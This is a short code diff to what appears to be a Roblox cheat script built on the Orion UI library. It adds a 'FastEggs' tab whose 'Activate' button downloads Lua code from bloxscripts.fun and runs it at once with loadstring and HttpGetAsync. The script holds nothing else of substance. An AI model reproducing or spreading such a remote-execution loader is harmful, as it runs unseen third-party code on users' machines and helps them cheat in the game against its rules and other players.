@@ -50,4 +50,18 @@ Tab:AddButton({
     end    
 })
 
+local Tab = Window:MakeTab({
+	Name = "FastEggs",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "Activate",
+	Callback = function()
+      		print("button pressed")
+    loadstring(game:HttpGetAsync("https://bloxscripts.fun/scripts/cafac675d3.lua", true))()
+    end    
+})
+
 OrionLib:Init()
